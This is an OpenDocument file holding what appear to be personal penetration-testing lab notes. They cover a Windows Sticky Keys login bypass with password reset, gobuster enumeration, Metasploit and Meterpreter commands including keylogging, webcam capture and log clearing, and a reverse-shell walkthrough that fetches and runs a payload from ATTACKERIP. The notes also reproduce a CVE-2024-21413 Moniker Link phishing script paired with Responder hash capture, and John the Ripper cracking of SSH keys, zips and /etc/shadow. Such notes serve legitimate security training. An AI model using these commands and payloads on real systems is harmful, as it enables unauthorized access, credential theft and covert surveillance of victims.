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in" fo:line-height="120%" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P20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21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tyle="italic" fo:font-weight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WINDOWS ACCOUNT LOGIN ACCESS</text:p>
            <text:p text:style-name="P9">If we have physical access to target PC with Windows system, we can change any user password and log in as that user by exploiting Sticky Keys feature.<text:line-break/><text:line-break/>1. Insert win bootable USB<text:line-break/>2. On first installation screen press shift+F10 for command prompt to appear.<text:line-break/>3. In cmd type notepad.<text:line-break/>4. Go to Save file as to get File Explorer.<text:line-break/>5. In File Explorer navigate to System32, find file <text:span text:style-name="T1">sethc</text:span> (Sticky Keys) and rename it to sethc1.<text:line-break/>6. In same directory find file <text:span text:style-name="T1">cmd</text:span> and rename it to sethc.<text:line-break/>7. In cmd restart machine by typing: <text:span text:style-name="T1">wpeutil reboot</text:span><text:line-break/>8. Remove USB and go to login screen as usual.<text:line-break/>9. Press shift fast 5+ times until Sticky Keys - now cmd/command prompt opens.<text:line-break/>10. Now we have full system privileges and we can change user password<text:line-break/>11. To check usernames of all users type: <text:span text:style-name="T1">net user</text:span><text:line-break/>12. To change user password type: <text:span text:style-name="T1">net user "USERNAME" 1234</text:span><text:line-break/>So now password for user is 1234, and we can log in as user.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P7">GOBUSTER CRAWLER BRUTE FORCE WEBSITE PAGES</text:p>
            <text:p text:style-name="P9">Using wordlist, search for directories, subdomains, pages on webserver.<text:line-break/><text:span text:style-name="T1">gobuster dir -u http://WEBPAGE -w WORDLIST.txt</text:span><text:line-break/>-u is used to state the website we're scanning, <text:line-break/>-w takes a list of words to iterate through to find hidden pages <text:line-break/>-dir search for directories<text:line-break/>gobuster --help<text:line-break/>gobuster COMMAND --help<text:line-break/></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T1">Search through directories:</text:span><text:line-break/>gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64<text:line-break/><text:line-break/><text:span text:style-name="T1">Lists directories and inside files .php and .js</text:span><text:line-break/>gobuster dir -u "http://www.example.thm" -w WORDLIST -x .php,.js</text:p>
            <text:p text:style-name="P9"/>
            <text:p text:style-name="P7">Search through subdomains:<text:line-break/><text:span text:style-name="T11">gobuster dns -d example.thm -w WORDLIST <text:line-break/><text:line-break/></text:span>Search through vhosts (different websites on same ip):<text:line-break/><text:span text:style-name="T11">gobuster vhost -u "http://example.thm" -w WORDLIST <text:line-break/>gobuster vhost -u "http://IP" --domain example.thm -w WORDLIST --append-domain </text:span><text:soft-page-break/><text:span text:style-name="T11">--exclude-length 250-320</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P8"><text:bookmark text:name="docs-internal-guid-21ec7c8f-7fff-214c-a60b-fae2b988c422"/>METASPLOIT COMMANDS</text:p>
            <text:p text:style-name="P14">Msfconsole</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">Ls<text:line-break/>Ping 8.8.8.8 -c1 <text:s text:c="4"/></text:span><text:span text:style-name="T4"><text:s/>(counter 1)</text:span></text:p>
            <text:p text:style-name="P14">Help set</text:p>
            <text:p text:style-name="P14">History<text:line-break/>use MODULENAME</text:p>
            <text:p text:style-name="P14">Show options</text:p>
            <text:p text:style-name="P14">Show payloads</text:p>
            <text:p text:style-name="P14">Info MODULENAME</text:p>
            <text:p text:style-name="P14">Back</text:p>
            <text:p text:style-name="P12">Search SOMETHING</text:p>
            <text:p text:style-name="P12">Search type:auxiliary telnet</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T3">Set </text:span><text:span text:style-name="T2">RPORT</text:span><text:span text:style-name="T3">: “Remote port”, target port on the vulnerable system.</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T3">Set </text:span><text:span text:style-name="T2">PAYLOAD</text:span><text:span text:style-name="T3">: The payload you will use with the exploit.</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T3">Set </text:span><text:span text:style-name="T2">LHOST</text:span><text:span text:style-name="T3">: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.</text:span></text:p>
            <text:p text:style-name="P21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21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21"><text:span text:style-name="T2">Setg </text:span><text:span text:style-name="T3">-set values globally</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">Unset <text:s text:c="4"/>unset all <text:s/></text:span><text:span text:style-name="T7"><text:s/></text:span><text:span text:style-name="T3">-clear all parameters</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">Run <text:s/></text:span><text:span text:style-name="T3">- run configured exploit</text:span></text:p>
            <text:p text:style-name="P21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7"><text:s/></text:span><text:span text:style-name="T3">-switch to session number</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T3"><text:line-break/></text:span><text:span text:style-name="T2">Examples</text:span></text:p>
            <text:p text:style-name="P12">use exploit/windows/smb/ms17_010_eternalblue</text:p>
            <text:p text:style-name="P12">Show options</text:p>
            <text:p text:style-name="P12">set rhosts 10.10.165.3</text:p>
            <text:p text:style-name="P12">Set rhosts FILEWITHTARGETIPS.txt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P8"><text:bookmark text:name="docs-internal-guid-80e077b6-7fff-e2f0-251e-0943de18751a"/>METERPRETER COMMANDS</text:p>
            <text:p text:style-name="P14">Core commands</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">background</text:span><text:span text:style-name="T3">: Backgrounds the current session</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">exit</text:span><text:span text:style-name="T3">: Terminate the Meterpreter session</text:span></text:p>
            <text:p text:style-name="P21"><text:soft-page-break/><text:span text:style-name="T2">guid</text:span><text:span text:style-name="T3">: Get the session GUID (Globally Unique Identifier)</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">help</text:span><text:span text:style-name="T3">: Displays the help menu</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">info</text:span><text:span text:style-name="T3">: Displays information about a Post module</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">irb</text:span><text:span text:style-name="T3">: Opens an interactive Ruby shell on the current session</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">load</text:span><text:span text:style-name="T3">: Loads one or more Meterpreter extensions</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">migrate</text:span><text:span text:style-name="T3">: Allows you to migrate Meterpreter to another process</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">run</text:span><text:span text:style-name="T3">: Executes a Meterpreter script or Post module</text:span></text:p>
            <text:p text:style-name="P21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21"><text:span text:style-name="T2">edit</text:span><text:span text:style-name="T3">: will allow you to edit a file</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">search</text:span><text:span text:style-name="T3">: Will search for files</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">upload</text:span><text:span text:style-name="T3">: Will upload a file or directory</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">download</text:span><text:span text:style-name="T3">: Will download a file or directory<text:line-break/><text:line-break/></text:span><text:span text:style-name="T2">Networking commands</text:span></text:p>
            <text:p text:style-name="P12">arp: Displays the host ARP (Address Resolution Protocol) cache</text:p>
            <text:p text:style-name="P12">ifconfig: Displays network interfaces available on the target system</text:p>
            <text:p text:style-name="P12">netstat: Displays the network connections</text:p>
            <text:p text:style-name="P12">portfwd: Forwards a local port to a remote service</text:p>
            <text:p text:style-name="P12">route: Allows you to view and modify the routing table</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P14">System commands</text:p>
            <text:p text:style-name="P12">clearev: Clears the event logs</text:p>
            <text:p text:style-name="P12">execute: Executes a command</text:p>
            <text:p text:style-name="P12">getpid: Shows the current process identifier</text:p>
            <text:p text:style-name="P12">getuid: Shows the user that Meterpreter is running as</text:p>
            <text:p text:style-name="P12">kill: Terminates a process</text:p>
            <text:p text:style-name="P12">pkill: Terminates processes by name</text:p>
            <text:p text:style-name="P12">ps: Lists running processes</text:p>
            <text:p text:style-name="P12">reboot: Reboots the remote computer</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T3">: Drops into a system command shell like CMD/Powershell</text:span></text:p>
            <text:p text:style-name="P12">shutdown: Shuts down the remote computer</text:p>
            <text:p text:style-name="P12">sysinfo: Gets information about the remote system, such as OS</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P21"><text:span text:style-name="T2">Others Commands</text:span><text:span text:style-name="T7"> </text:span><text:span text:style-name="T3">(these will be listed under different menu categories in the help menu)</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">idletime</text:span><text:span text:style-name="T3">: Returns the number of seconds the remote user has been idle</text:span></text:p>
            <text:p text:style-name="P12">keyscan_dump: Dumps the keystroke buffer</text:p>
            <text:p text:style-name="P12">keyscan_start: Starts capturing keystrokes</text:p>
            <text:p text:style-name="P12">keyscan_stop: Stops capturing keystrokes</text:p>
            <text:p text:style-name="P12"><text:soft-page-break/>screenshare: Allows you to watch the remote user's desktop in real time</text:p>
            <text:p text:style-name="P12">screenshot: Grabs a screenshot of the interactive desktop</text:p>
            <text:p text:style-name="P12">record_mic: Records audio from the default microphone for X seconds</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">webcam_chat</text:span><text:span text:style-name="T3">: Starts a video chat</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">webcam_list</text:span><text:span text:style-name="T3">: Lists webcams</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">webcam_snap</text:span><text:span text:style-name="T3">: Takes a snapshot from the specified webcam</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">webcam_stream</text:span><text:span text:style-name="T3">: Plays a video stream from the specified webcam</text:span></text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T2">getsystem</text:span><text:span text:style-name="T3">: Attempts to elevate your privilege to that of local system</text:span></text:p>
            <text:p text:style-name="P10"><text:span text:style-name="T2">hashdump</text:span><text:span text:style-name="T5">: Dumps the contents of the SAM database</text:span> </text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P11">METERPRETER REVERSE SHELL EXAMPLE <text:s text:c="2"/></text:p>
            <text:p text:style-name="P10">On attacker:</text:p>
            <text:p text:style-name="P10">msfvenom -p php/reverse_php LHOST=ATTACKERIP LPORT=8888 -f raw &gt; reverse_shell.php</text:p>
            <text:p text:style-name="P10">use exploit/multi/handler</text:p>
            <text:p text:style-name="P10">set payload linux/x86/meterpreter/reverse_tcp</text:p>
            <text:p text:style-name="P10">set lhost ATTACKERIP</text:p>
            <text:p text:style-name="P10">set lport 9000</text:p>
            <text:p text:style-name="P10">run</text:p>
            <text:p text:style-name="P10">Transfer file to target device, on attacker device <text:span text:style-name="T1">run HTTP server</text:span>:</text:p>
            <text:p text:style-name="P10">python3 -m http.server 9000 <text:s text:c="5"/>(open http on port 9000)</text:p>
            <text:p text:style-name="P10">On target device:</text:p>
            <text:p text:style-name="P10">wget http://ATTACKERIP:9000/reverse_shell.php</text:p>
            <text:p text:style-name="P10">chmod 777 reverse_shell.php</text:p>
            <text:p text:style-name="P10">./reverse_shell.php</text:p>
            <text:p text:style-name="P10">Now reverse shell on meterpreter is opened.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3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3">Example Monkier link in HTML code to send on target to click:</text:p>
            <text:p text:style-name="P15">&lt;a href="file://ATTACKER_IP/test!example"&gt;Click me&lt;/a&gt;.</text:p>
            <text:p text:style-name="P22"/>
            <text:p text:style-name="P15">Moniker link script for remote code execution, save as example.py</text:p>
            <text:p text:style-name="P17">'''</text:p>
            <text:p text:style-name="P17"><text:soft-page-break/>Author: CMNatic | https://github.com/cmnatic</text:p>
            <text:p text:style-name="P17">Version: 1.0 | 19/02/2024</text:p>
            <text:p text:style-name="P17">'''</text:p>
            <text:p text:style-name="P17">import smtplib</text:p>
            <text:p text:style-name="P17">from email.mime.text import MIMEText</text:p>
            <text:p text:style-name="P17">from email.mime.multipart import MIMEMultipart</text:p>
            <text:p text:style-name="P17">from email.utils import formataddr</text:p>
            <text:p text:style-name="P17">sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address</text:p>
            <text:p text:style-name="P17">receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address</text:p>
            <text:p text:style-name="P17">password = input("Enter your attacker email password: ")</text:p>
            <text:p text:style-name="P17">html_content = """\</text:p>
            <text:p text:style-name="P17">&lt;!DOCTYPE html&gt;</text:p>
            <text:p text:style-name="P17">&lt;html lang="en"&gt;</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!example"&gt;Click me&lt;/a&gt;&lt;/p&gt;</text:span></text:p>
            <text:p text:style-name="P22"/>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">&lt;/body&gt;</text:span></text:p>
            <text:p text:style-name="P17">&lt;/html&gt;"""</text:p>
            <text:p text:style-name="P17">message = MIMEMultipart()</text:p>
            <text:p text:style-name="P17">message['Subject'] = "CVE-2024-21413"</text:p>
            <text:p text:style-name="P17">message["From"] = formataddr(('CMNatic', sender_email))</text:p>
            <text:p text:style-name="P17">message["To"] = receiver_email</text:p>
            <text:p text:style-name="P17"># Convert the HTML string into bytes and attach it to the message object</text:p>
            <text:p text:style-name="P17">msgHtml = MIMEText(html_content,'html')</text:p>
            <text:p text:style-name="P17">message.attach(msgHtml)</text:p>
            <text:p text:style-name="P17">server = smtplib.SMTP('MAILSERVER', 25)</text:p>
            <text:p text:style-name="P17">server.ehlo()</text:p>
            <text:p text:style-name="P17">try:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">server.login(sender_email, password)</text:span></text:p>
            <text:p text:style-name="P17">except Exception as err:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">print(err)</text:span></text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">exit(-1)</text:span></text:p>
            <text:p text:style-name="P17">try:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">server.sendmail(sender_email, [receiver_email], message.as_string())</text:span></text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">print("\n Email delivered")</text:span></text:p>
            <text:p text:style-name="P17">except Exception as error:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">print(error)</text:span></text:p>
            <text:p text:style-name="P17">finally:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T10">server.quit()</text:span></text:p>
            <text:p text:style-name="P13"><text:line-break/>With responder tool listen on ens5 network interface:</text:p>
            <text:p text:style-name="P15"><text:soft-page-break/>responder -I ens5</text:p>
            <text:p text:style-name="P20"><text:span text:style-name="T6">Run python </text:span><text:a xlink:type="simple" xlink:href="http://exploit.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T8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9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21"><text:span text:style-name="T2">Crack the SSH private key from id_rsa and brute force hash to get password</text:span><text:span text:style-name="T3">. ssh2john converts the id_rsa private key, which is used to log in to the SSH session, into a hash </text:span><text:span text:style-name="T3">format that John can work with.</text:span></text:p>
            <text:p text:style-name="P12">python3 /opt/john/ssh2john.py</text:p>
            <text:p text:style-name="P12">ssh2john [id_rsa private key file] &gt; [output file]</text:p>
            <text:p text:style-name="P12">/opt/john/<text:span text:style-name="T1">ssh2john.py FILE.id_rsa &gt; ssh_hash.txt</text:span></text:p>
            <text:p text:style-name="P12">john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P14">Zip2john</text:p>
            <text:p text:style-name="P12">Brute force ZIP password protected file. First create hash from zip file.<text:line-break/>zip2john SOMEZIP.zip &gt; ziphash.txt<text:line-break/>Brute force hash zip file for password.</text:p>
            <text:p text:style-name="P12">john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt</text:p>
            <text:p text:style-name="P12">john --show ziphash.txt</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P14">Custom rules John</text:p>
            <text:p text:style-name="P12">Custom passwords generator.<text:line-break/>In file: /opt/john/john.conf <text:s/>or /etc/john/john.conf <text:s/>create:</text:p>
            <text:p text:style-name="P12">[List.Rules:THMRules] is used to define the name of your rule</text:p>
            <text:p text:style-name="P12">Az: Takes the word and appends it with the characters you define</text:p>
            <text:p text:style-name="P12">A0: Takes the word and prepends it with the characters you define</text:p>
            <text:p text:style-name="P12">c: Capitalises the character positionally</text:p>
            <text:p text:style-name="P12">[0-9]: Will include numbers 0-9</text:p>
            <text:p text:style-name="P12">[0]: Will include only the number 0</text:p>
            <text:p text:style-name="P12">[A-z]: Will include both upper and lowercase</text:p>
            <text:p text:style-name="P12">[A-Z]: Will include only uppercase letters</text:p>
            <text:p text:style-name="P12"><text:soft-page-break/>[a-z]: Will include only lowercase letters</text:p>
            <text:p text:style-name="P14">Example: [List.Rules:PoloPassword]</text:p>
            <text:p text:style-name="P12">cAz"[0-9] [!£$%@]"</text:p>
            <text:p text:style-name="P12">Utilises the following: c: Capitalises the first letter, Az: Appends to the end of the word, [0-9]: A number in the range 0-9</text:p>
            <text:p text:style-name="P12">[!£$%@]: The password is followed by one of these symbols. <text:line-break/>We cand then call this custom rule with argument using the --rule=PoloPassword flag.</text:p>
            <text:p text:style-name="P16">john --wordlist=[path to wordlist] --rule=PoloPassword [path to hashfile]</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P14">UNHASH ROOT USER SHADOW FILE WITH JOHN</text:p>
            <text:p text:style-name="P12">Unshadow /etc/passwd /etc/shadow &gt; passfile.txt</text:p>
            <text:p text:style-name="P12">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passfile.txt</text:p>
            <text:p text:style-name="P12">John --show passfile.txt</text:p>
            <text:p text:style-name="P10"/>
            <text:p text:style-name="P14">JOHN THE RIPPER - CRACK HASH</text:p>
            <text:p text:style-name="P21"><text:span text:style-name="T3">john --wordlist=[path to wordlist] --format=[format] [path to hashfile]<text:line-break/></text:span><text:span text:style-name="T3"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pan text:style-name="T3">Python hash identifier:</text:span></text:p>
            <text:p text:style-name="P12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9"><text:span text:style-name="T6">Launch hash identifier: python3 </text:span><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T8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12">john --list=formats | grep -iF "md5"</text:p>
            <text:p text:style-name="P12">Example full command:</text:p>
            <text:p text:style-name="P16">john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt</text:p>
            <text:p text:style-name="P12">Check cracked hash:</text:p>
            <text:p text:style-name="P16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31T11:48:29.88</meta:creation-date>
    <meta:editing-duration>P0D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8" meta:paragraph-count="202" meta:word-count="1562" meta:character-count="10892"/>
  </office:meta>
</office:document-meta>
</file>